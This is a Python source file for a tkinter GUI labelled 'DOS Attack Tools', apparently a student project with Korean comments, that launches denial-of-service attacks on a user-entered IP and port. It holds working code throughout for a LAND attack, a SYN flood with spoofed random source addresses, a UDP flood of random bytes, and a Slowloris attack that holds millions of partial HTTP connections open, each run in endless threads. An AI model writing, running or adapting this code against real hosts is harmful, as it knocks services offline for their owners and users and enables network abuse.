from tkinter import *
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
from scapy.all import *
from scapy.layers.inet import TCP, UDP, IP
import sys
import random

root = tk.Tk()
ip,port = 0,0
stop = 0
sent= 0

pythonlogo = ImageTk.PhotoImage(Image.open('pythonlogo.png'))
exitlogo = ImageTk.PhotoImage(Image.open('exit.png'))
bg2 = ImageTk.PhotoImage(Image.open('bggreen2.jpg'))
choice = IntVar(0)
#choice.set(1)



def mains():
    def on_resize(event):
        image = bgimg.resize((event.width, event.height), Image.ANTIALIAS)
        l.image = ImageTk.PhotoImage(image)
        l.config(image=l.image)

    #root.wm_attributes("-topmost", 1)
    #root.overrideredirect(True)

    root.title("DOS Attack Tools")
    root.geometry('500x400')
    root.resizable(0, 0)
    bgimg = Image.open('bggreen.png')  # load the background image
    l = tk.Label(root)
    l.place(x=0, y=0, relwidth=1, relheight=1)  # make label l to fit the parent window always
    l.bind('<Configure>', on_resize)  # on_resize will be executed whenever label l is resized
    #e1 = tk.Entry(root)

    pylogo=Label(root, image=pythonlogo)
    pylogo.place(x=10, y=10, width=30, height=30)

    exlogo=Button(root, image=exitlogo, bg='#2ACD72', border=0, command=exitclick)
    exlogo.place(x=460, y=8, width=30, height=30)

    UP_title = Label(root, text="Select the Attacking Tool", height=2, font=("Arial", 18, 'bold'), bg='#2ACD72', fg='white')
    UP_title.place(x=20, y=45, width=460)

    Land_main = Label(root, text="Select the attacking tool you want to do 'DoS Attack' with", font=("Arial",10))
    Land_main.place(x=0, y=380, width=500)

    Land_button = Button(root, text="Land Attack", overrelief="solid", command=Land_Attack,
                         font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Flooding_button = Button(root, text="TCP/UDP Flooding Attack", overrelief="solid", command=Flooding_Attack,
                             font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Slow_button = Button(root, text="Slowless Attack", overrelief="solid", command=Slow_Attack,
                         font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Land_button.place(x=100, y=125, width=300, height=45)
    Flooding_button.place(x=100, y=195, width=300, height=45)
    Slow_button.place(x=100, y=265, width=300, height=45)

#def inputlandattack():


#def inputfloodattack():



def inputslowattack():

    def on_resize(event):
        image = bgimg.resize((event.width, event.height), Image.ANTIALIAS)
        l.image = ImageTk.PhotoImage(image)
        l.config(image=l.image)

    bgimg = Image.open('bggreen2.png')  # load the background image
    l = tk.Label(root)
    l.place(x=70, y=83, width=300, height=34)  # make label l to fit the parent window always
    l.bind('<Configure>', on_resize)  # on_resize will be executed whenever label l is resized


    def on_resize2(event):
        image = bgimg2.resize((event.width, event.height), Image.ANTIALIAS)
        l2.image = ImageTk.PhotoImage(image)
        l2.config(image=l2.image)

    bgimg2 = Image.open('bggreen2.png')
    l2 = tk.Label(root)
    l2.place(x=70, y=153, width=300, height=34)
    l2.bind('<Configure>', on_resize2)

    Land_IP = Label(root, text="INPUT IP", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_IP.place(x=80, y=91, width=80, height=20)

    input_ip = Entry(root, width=20, textvariable=str)
    input_ip.place(x=170, y=91)

    Land_PORT = Label(root, text="INPUT PORT", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_PORT.place(x=80, y=160, width=110, height=20)

    input_port = Entry(root, width=15, textvariable=str)
    input_port.place(x=200, y=160)

    def start():
        print({input_ip},{input_port})

    def stop():
        print({input_ip},{input_port})


def Land_Attack():
    root.title("Land Attack")

    def on_resize3(event):
        image = bgimg3.resize((event.width, event.height), Image.ANTIALIAS)
        l3.image = ImageTk.PhotoImage(image)
        l3.config(image=l3.image)

    root.resizable(0, 0)
    bgimg3 = Image.open('bggreen.png')  # load the background image
    l3 = tk.Label(root)
    l3.place(x=0, y=0, relwidth=1, relheight=1)  # make label l to fit the parent window always
    l3.bind('<Configure>', on_resize3)  # on_resize will be executed whenever label l is resized
    # e1 = tk.Entry(root)

    #inputlandattack()

    def on_resize(event):
        image = bgimg.resize((event.width, event.height), Image.ANTIALIAS)
        l.image = ImageTk.PhotoImage(image)
        l.config(image=l.image)

    bgimg = Image.open('bggreen2.png')  # load the background image
    l = tk.Label(root)
    l.place(x=70, y=83, width=300, height=34)  # make label l to fit the parent window always
    l.bind('<Configure>', on_resize)  # on_resize will be executed whenever label l is resized


    def on_resize2(event):
        image = bgimg2.resize((event.width, event.height), Image.ANTIALIAS)
        l2.image = ImageTk.PhotoImage(image)
        l2.config(image=l2.image)

    bgimg2 = Image.open('bggreen3.png')
    l2 = tk.Label(root)
    l2.place(x=70, y=153, width=300, height=34)
    l2.bind('<Configure>', on_resize2)

    #ip1 = StringVar()

    #a = (tk.Entry.get(input_ip))

    Land_IP = Label(root, text="INPUT IP", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_IP.place(x=80, y=91, width=80, height=20)

    input_ip = Entry(root, width=20, textvariable=str)
    input_ip.place(x=170, y=91)

    global ip
    ip = input_ip.get()

    Land_PORT = Label(root, text="INPUT PORT", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_PORT.place(x=80, y=160, width=110, height=20)

    input_port = Entry(root, width=15, textvariable=str)
    input_port.place(x=200, y=160)

    global port
    port = input_port.get()


    # c = value

    def start():
        print({input_ip},{input_port})

    def stop():
        print({input_ip},{input_port})

    #r=IntVar()
    def tcp_udp():
        ip = tk.Entry.get(input_ip)
        port = tk.Entry.get(input_port)
        if (choice.get()) == 1:
            prot = "tcp"
        else:
            prot = "udp"
        b1Attack(ip,port,prot)


    tcp = Radiobutton(root, variable=choice, bg='#22B060', value=1)
    tcp.place(x=400, y=82, width=50, height=35)

    #print(choice.get())

    tcpcheckbox = Label(root, text="TCP", font=('Arial', 10, 'bold'), bg='#22B060', fg='white')
    tcpcheckbox.place(x=430, y=82, width=50, height=35)

    udp = Radiobutton(root, var=choice, bg='#22B060', value=2)
    udp.place(x=400, y=152, width=50, height=35)

    udpcheckbox = Label(root, text="UDP", font=('Arial', 10, 'bold'), bg='#22B060', fg='white')
    udpcheckbox.place(x=430, y=152, width=50, height=35)

    UP_title = Label(root, text="Land Attack", height=2, font=("Arial", 20, 'bold'), bg='#2ACD72', fg='white')
    UP_title.place(x=0, y=0, width=500)

    Start_button = Button(root, text="Start", command=tcp_udp,
                          font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)


    Start_button.place(x=120, y=250, width=80, height=35)

    Stop_button = Button(root, text="Stop", command=ATTACKSTOP,
                         font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Stop_button.place(x=240, y=250, width=80, height=35)

    Ret_button = Button(root, text="Menu", command=mains,
                        font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Ret_button.place(x=402, y=348, width=80, height=35)


def Flooding_Attack():
    root.title("Flooding Attack")

    def on_resize3(event):
        image = bgimg3.resize((event.width, event.height), Image.ANTIALIAS)
        l3.image = ImageTk.PhotoImage(image)
        l3.config(image=l3.image)

    root.resizable(0, 0)
    bgimg3 = Image.open('bggreen.png')  # load the background image
    l3 = tk.Label(root)
    l3.place(x=0, y=0, relwidth=1, relheight=1)  # make label l to fit the parent window always
    l3.bind('<Configure>', on_resize3)  # on_resize will be executed whenever label l is resized

    # e1 = tk.Entry(root)

    # inputlandattack()

    def on_resize(event):
        image = bgimg.resize((event.width, event.height), Image.ANTIALIAS)
        l.image = ImageTk.PhotoImage(image)
        l.config(image=l.image)

    bgimg = Image.open('bggreen2.png')  # load the background image
    l = tk.Label(root)
    l.place(x=70, y=83, width=300, height=34)  # make label l to fit the parent window always
    l.bind('<Configure>', on_resize)  # on_resize will be executed whenever label l is resized

    def on_resize2(event):
        image = bgimg2.resize((event.width, event.height), Image.ANTIALIAS)
        l2.image = ImageTk.PhotoImage(image)
        l2.config(image=l2.image)

    bgimg2 = Image.open('bggreen3.png')
    l2 = tk.Label(root)
    l2.place(x=70, y=153, width=300, height=34)
    l2.bind('<Configure>', on_resize2)


    Land_IP = Label(root, text="INPUT IP", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_IP.place(x=80, y=91, width=80, height=20)

    input_ip = Entry(root, width=20, textvariable=str)
    input_ip.place(x=170, y=91)

    global ip
    ip = input_ip.get()

    Land_PORT = Label(root, text="INPUT PORT", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_PORT.place(x=80, y=160, width=110, height=20)

    input_port = Entry(root, width=15, textvariable=str)
    input_port.place(x=200, y=160)

    global port
    port = input_port.get()

    def start():
        print({input_ip},{input_port})

    def stop():
        print({input_ip},{input_port})




    def tcp_udp():
        ip = tk.Entry.get(input_ip)
        port = tk.Entry.get(input_port)
        if (choice.get()) == 1:
            prot = "tcp"
        else:
            prot = "udp"
        b2Attack(ip,port,prot)

    tcp = Radiobutton(root, var=choice, bg='#22B060', value=1)
    tcp.place(x=400, y=82, width=50, height=35)

    tcpcheckbox = Label(root, text="TCP", font=('Arial', 10, 'bold'), bg='#22B060', fg='white')
    tcpcheckbox.place(x=430, y=82, width=50, height=35)

    udp = Radiobutton(root, var=choice, bg='#22B060', value=2)
    udp.place(x=400, y=152, width=50, height=35)

    udpcheckbox = Label(root, text="UDP", font=('Arial', 10, 'bold'), bg='#22B060', fg='white')
    udpcheckbox.place(x=430, y=152, width=50, height=35)


    UP_title = Label(root, text="TCP/UDP Flooding Attack", height=2, font=("Arial", 20, 'bold'), bg='#2ACD72', fg='white')
    UP_title.place(x=0, y=0, width=500)

    Start_button = Button(root, text="Start", command=tcp_udp,
                          font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Start_button.place(x=120, y=250, width=80, height=35)

    Stop_button = Button(root, text="Stop", command=ATTACKSTOP,
                         font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Stop_button.place(x=240, y=250, width=80, height=35)

    Ret_button = Button(root, text="Menu", command=mains,
                        font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Ret_button.place(x=402, y=348, width=80, height=35)


def Slow_Attack():
    root.title("Slowless Attack")

    def on_resize3(event):
        image = bgimg3.resize((event.width, event.height), Image.ANTIALIAS)
        l3.image = ImageTk.PhotoImage(image)
        l3.config(image=l3.image)

    root.resizable(0, 0)
    bgimg3 = Image.open('bggreen.png')  # load the background image
    l3 = tk.Label(root)
    l3.place(x=0, y=0, relwidth=1, relheight=1)  # make label l to fit the parent window always
    l3.bind('<Configure>', on_resize3)  # on_resize will be executed whenever label l is resized

    # e1 = tk.Entry(root)

    # inputlandattack()

    def on_resize(event):
        image = bgimg.resize((event.width, event.height), Image.ANTIALIAS)
        l.image = ImageTk.PhotoImage(image)
        l.config(image=l.image)

    bgimg = Image.open('bggreen2.png')  # load the background image
    l = tk.Label(root)
    l.place(x=70, y=83, width=300, height=34)  # make label l to fit the parent window always
    l.bind('<Configure>', on_resize)  # on_resize will be executed whenever label l is resized

    def on_resize2(event):
        image = bgimg2.resize((event.width, event.height), Image.ANTIALIAS)
        l2.image = ImageTk.PhotoImage(image)
        l2.config(image=l2.image)

    bgimg2 = Image.open('bggreen3.png')
    l2 = tk.Label(root)
    l2.place(x=70, y=153, width=300, height=34)
    l2.bind('<Configure>', on_resize2)

    #inputslowattack()
    Land_IP = Label(root, text="INPUT IP", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_IP.place(x=80, y=91, width=80, height=20)

    input_ip = Entry(root, width=20, textvariable=str)
    input_ip.place(x=170, y=91)

    global ip
    ip = input_ip.get()

    infom = Label(root, text="*SLOWLORIS ATTACK ONLY USE TCP*", font=("Arial", 9, 'bold'), bg='#22B060', fg='white', border=0)
    infom.place(x=70, y=210, width=410, height=20)

    Land_PORT = Label(root, text="INPUT PORT", font=("Arial", 13, 'bold'), bg='#22B060', fg='white', border=0)
    Land_PORT.place(x=80, y=160, width=110, height=20)

    input_port = Entry(root, width=15, textvariable=str)
    input_port.place(x=200, y=160)

    global port
    port = input_port.get()

    def start():
        print({input_ip}, {input_port})

    def stop():
        print({input_ip}, {input_port})

    def tcp_udp():
        ip = tk.Entry.get(input_ip)
        port = tk.Entry.get(input_port)
        if (choice.get()) == 1:
            prot = "tcp"
        else:
            prot = "udp"
        b3Attack(ip, port, prot)

    tcp = Radiobutton(root, var=choice, bg='#22B060', value=1)
    tcp.place(x=400, y=82, width=50, height=35)

    tcpcheckbox = Label(root, text="TCP", font=('Arial', 10, 'bold'), bg='#22B060', fg='white')
    tcpcheckbox.place(x=430, y=82, width=50, height=35)

    udp = Radiobutton(root, var=choice, bg='#22B060', value=2)
    udp.place(x=400, y=152, width=50, height=35)

    udpcheckbox = Label(root, text="UDP", font=('Arial', 10, 'bold'), bg='#22B060', fg='white')
    udpcheckbox.place(x=430, y=152, width=50, height=35)

    UP_title = Label(root, text="Slowless Attack", height=2, font=("Arial", 20, 'bold'), bg='#2ACD72',
                     fg='white')
    UP_title.place(x=0, y=0, width=500)

    Start_button = Button(root, text="Start", command=tcp_udp,
                          font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Start_button.place(x=120, y=250, width=80, height=35)

    Stop_button = Button(root, text="Stop", command=ATTACKSTOP,
                         font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Stop_button.place(x=240, y=250, width=80, height=35)

    Ret_button = Button(root, text="Menu", command=mains,
                        font=("Arial", 15, 'bold'), bg='#22B060', fg='white', border=0)

    Ret_button.place(x=402, y=348, width=80, height=35)


#LAND attack 버튼
def b1Attack(ip, port, prot):
    messagebox.showinfo('LAND ATTACK', 'LAND ATTACK START')
    global count
    global stop
    stop = 0
    def land_attack(ip,port,prot):
        if stop == 1:
            print("공격이 중지되었습니다\n")
            sys.exit(1)
        count = 1
        info()
        try:
            if prot == 'tcp' or prot == 'TCP':
                lands= IP(src=ip,dst=ip)/TCP(sport=port,dport=port)  # 출발지랑 목적지 IP랑 Port 같게하기
                send(lands)  # 전송
                print("Packet sent(TCP): %d번째" %(count))
                count += 1

            elif prot == 'udp' or prot == 'UDP':
                lands = IP(src=ip,dst=ip)/UDP(sport=port,dport=port)
                send(lands)
                print("Packet sent(UDP): %d번째" %(count))
                count += 1

        except KeyboardInterrupt as e:
            sys.exit(1)

    def land_thread():
        while (True):
            land_attack(ip, int(port), prot)


    try:
        thread1= threading.Thread(target=land_thread)
        thread1.start()
    except Exception as e:
        print(e)



    #click()


#TCP/UDP Flooding attack 버튼
def b2Attack(dstIP, dstPort, prot):
    messagebox.showinfo('TCP/UDP Flooding ATTACK', 'TCP/UDP Flooding ATTACK START')
    global stop
    stop = 0
    def randomIP():
        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        return ip

    def randInt():
        x = random.randint(1000, 9000)
        return x

    def SYN_Flood(dstIP, dstPort, prot):
        #global stop
        if stop == 1:
            print("공격이 중지되었습니다\n")
            sys.exit(1)
        total = 0
        print("Packets are sending...")
        #for x in range(0, counter):

        try:


            if prot == 'tcp' or prot == 'TCP':
                s_port = randInt()
                s_eq = randInt()
                w_indow = randInt()
                IP_Packet = IP()
                IP_Packet.src = randomIP()
                IP_Packet.dst = dstIP
                TCP_Packet = TCP()
                TCP_Packet.sport = s_port
                TCP_Packet.dport = dstPort
                TCP_Packet.flags = "S"
                TCP_Packet.seq = s_eq
                TCP_Packet.window = w_indow

                send(IP_Packet / TCP_Packet, verbose=0)

                total = total + 1
            #-----------------------------------------------24일날 할꺼
            if prot == 'udp' or prot == 'UDP':
                duration = 10
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
                bytes = random._urandom(1024)
                timeout = time.time() + duration
                sent = 0
                if time.time() > timeout:
                    sys.exit(1)
                else:
                    pass
                client.sendto(bytes, (dstIP, dstPort))
                sent = sent + 1
                print("Attacking " + str(sent) + " sent packages " + dstIP + " at the port " + str(port))
                client.close()

            #-----------------------------------------------------------24일날
        except KeyboardInterrupt as e:
            sys.exit(1)

    def flood_thread():
        while True:
            SYN_Flood(dstIP, int(dstPort), prot)

    try:
        thread1=threading.Thread(target=flood_thread)
        thread1.start()
    except Exception as e:
        print(e)

    sys.stdout.write("\nTotal packets sent: %i\n")


#slow attack 버튼
def b3Attack(dstIP, dstPort, prot):
    messagebox.showinfo('Slowloris ATTACK', 'Slowloris ATTACK START')

    global stop
    stop = 0
    #ip=dstIP
    headers = [
        "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Accept-language: en-US,en"
    ]

    sockets = []

    def slow(dstIP, dstPort):

        def setupSocket(ip):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, dstPort))
            sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
            for header in headers:
                sock.send("{}\r\n".format(header).encode("utf-8"))
            return sock

        if __name__ == "__main__":
            """if len(sys.argv) != 2:
                print("Use it like this: python {} example.com".format(sys.argv[0]))
                sys.exit()"""
            ip = dstIP
            count = 9999999
            print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
            for _ in range(count):
                try:
                    print("Socket {}".format(_))
                    sock = setupSocket(ip)
                except socket.error:
                    break
                sockets.append(sock)
            while True:
                if stop == 1:
                    print("공격이 중지되었습니다\n")
                    sys.exit(1)
                print("Connected to {} sockets. Sending headers...".format(len(sockets)))
                for sock in list(sockets):
                    try:
                        sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                    except socket.error:
                        sockets.remove(sock)
                for _ in range(count - len(sockets)):
                    print("Re-opening closed sockets...")
                    try:
                        sock = setupSocket(ip)
                        if sock:
                            sockets.append(sock)
                    except socket.error:
                        break
                time.sleep(15)

    def slow_thread():
        while True:
            slow(dstIP, int(dstPort))

    try:
        thread1 = threading.Thread(target=slow_thread)
        thread1.start()
    except Exception as e:
        print(e)



#모든 attack 멈춤
def ATTACKSTOP():
    messagebox.showinfo('ATTACK STOP', 'ATTACK STOP')
    global stop
    stop = 1
    assert stop == 1, "공격이 중지 되었습니다"


def exitclick():
    exit()

def info():
    global ip,port
    print("---------------------------------------------------------------\n")
    print("Host: {0} 에서 Dest ip:{1} Dest port:{2} 로 공격을 시작합니다.\n".format(socket.gethostbyname(socket.getfqdn()),ip,port))
    print("---------------------------------------------------------------\n")

mains()

root.mainloop()